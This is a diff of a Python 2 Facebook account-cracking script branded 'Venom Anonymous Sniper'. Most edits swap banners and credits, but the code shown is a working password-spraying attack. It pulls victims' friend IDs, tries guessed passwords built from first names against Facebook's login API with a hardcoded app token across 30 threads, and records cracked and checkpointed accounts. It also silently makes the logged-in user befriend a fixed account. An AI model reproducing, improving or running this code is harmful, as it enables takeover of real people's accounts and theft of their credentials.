@@ -48,23 +48,16 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;98m _____ ______     ___         ___   4
-\033[1;98m| ____|  __  |    \  \       /  /  4 4
-\033[1;98m| |   | |  | |     \  \     /  /  4  4
-\033[1;98m| |___| |__/ | _   _\  \   /  /  4   4
-\033[1;98m|  ___|  __ < \ \ / /\  \ /  /  444444
-\033[1;98m| |   | |  \ | \ v /  \  V  /        4
-\033[1;98m| |   | |__| | / / \   \   /         4
-\033[1;98m|_|   |______|/_/ \_\   \_/          4
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯ Creator =  ZERO & ZxXx-ANGEL & ZALASXA            ║    
-\033[1;98m    ║✯ Youtube =  Zero                                  ║  
-\033[1;96m    ║✯ WhatsApp=  +6285320091382                        ║
+\033[1;96m    ║✯ BY           :  Zero & ZxXx-Angel & ZalasXa      ║    
+\033[1;98m    ║✯ Youtube      :  Zero                             ║  
+\033[1;96m    ║✯ Instagram Me : zero_xvip                         ║
 \033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(
+		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)
+
 
 back = 0
 berhasil = []
@@ -78,35 +71,29 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;97m************************************************
-\033[1;96m           Ask me if you need help 
+\033[1;96m     SUBSCRIBE MY CHANNEL -- VENOM ANONYMOUS
 \033[1;97m************************************************
 
-\033[1;95m    ⚠️WARNING⚠️
-\033[1;95m   STAY AT HOME
-\033[1;95m     COVID-19
-\033[1;95m Subscrine Ny Channel
-\033[1;95m      YT:Zero
-"""
-jalan("\033[1;92m  _____ ______     ___         ___   4                   ")             
-jalan("\033[1;92m | ____|  __  |    \  \       /  /  4 4                ")             
-jalan("\033[1;92m | |   | |  | |     \  \     /  /  4  4                    BY ZERO & ZXXX-ANGEL & ZALASXA") 
-jalan("\033[1;97m | |___| |__/ | _   _\  \   /  /  4   4                  ")
-jalan("\033[1;97m |  ___|  __ < \ \ / /\  \ /  /  444444                          V3N0M ANONYMOUS SNIPER")
-jalan("\033[1;92m | |   | |  \ | \ v /  \  V  /        4                ")
-jalan("\033[1;92m | |   | |__| | / / \   \   /         4                                 FOLLOW US")                                   
-jalan("\033[1;92m |_|   |______|/_/ \_\   \_/          4                 ")
+jalan("\033[1;92m         WE ARE ANONYMOUS")             
+jalan("\033[1;92m          WE ARE LEGION")             
+jalan("\033[1;92m          UNITED BY ONE") 
+jalan("\033[1;97m         DEVIDED BY ZERO")
+jalan("\033[1;97m        WE DO NOT FORGIVE")
+jalan("\033[1;92m        WE DO NOT FORGET")
+jalan("\033[1;92m   IT IS TO LATE TOO EXPECT US")                                  
+jalan("\033[1;92m     VENOM ANONYMOUS SNIPER")
 
 
 
-CorrectUsername = "ZxXx-Angel"
-CorrectPassword = "ZalasXa"
+CorrectUsername = "ZalasXa"
+CorrectPassword = "ZxXx-Angel"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m😘 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m😘 \x1b[1;95mTool Password \x1b[1;91m»» \x1b[1;91m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:V3N0M
+            print "Logged in successfully as " + username #Dev:Venom
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -132,7 +119,7 @@ def login():
 		try:
 			br.open('https://m.facebook.com')
 		except mechanize.URLError:
-			print"\n\033[1;96m[!] \x1b[1;91mNo connection"
+			print"\n\033[1;96m[!] \x1b[1;91mNo Internet"
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
@@ -159,15 +146,15 @@ def login():
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\033[1;96m[!] \x1b[1;91mNo Connection"
+				print"\n\033[1;96m[!] \x1b[1;91mNo Internet"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91maccount checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mYour Account Is On Checkpoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\033[1;96m[!] \x1b[1;91mIncorrect password/Email")
+			print("\n\033[1;96m[!] \x1b[1;91mIncorret Password/Emal")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -207,7 +194,7 @@ def menu():
 	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "\033[1;36;40m      ╚═════════════════════════════════╝"
-	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Hacking"	
+	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start😘Hacking"	
 	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
 	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
 	pilih()
@@ -306,7 +293,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:V3N0M
+			pass #Dev:Venom
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -354,7 +341,7 @@ def pilih_super():
 				               cek.close()
 				               cekpoint.append(user+pass2)								
 				           else:											
-					       pass3 = 'Anjing'										
+					       pass3 = b['first_name']+'sayang'										
 					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					       q = json.load(data)										
 					       if 'access_token' in q:	
@@ -376,7 +363,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = 'Doraemon'											
+						           pass4 = 'sayang'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -398,7 +385,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = 'Sayang'							
+						                       pass5 = 'Doraemon'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -464,7 +451,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = b['first_name']+'sayang'											
+										                           pass8 = 'kontol'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -486,7 +473,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
+										                                       pass9 = b['first_name'] + '123'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -515,9 +502,9 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mV3N0M\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By ZERO-ZxXxANGEL-ZALASXA--•◈•---»" #Dev:V3N0M
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 FBxMOD.py)↩\033[1;97m....'
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackLover\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By Zero &Z-Z--•◈•---»" #Dev:Venom
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 FBxV4.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
@@ -540,7 +527,7 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....Usama Tricker YT....... \033[1;95m :
+: \033[1;91m ....Venom Sniper....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
               \033[1;91m Zero"""
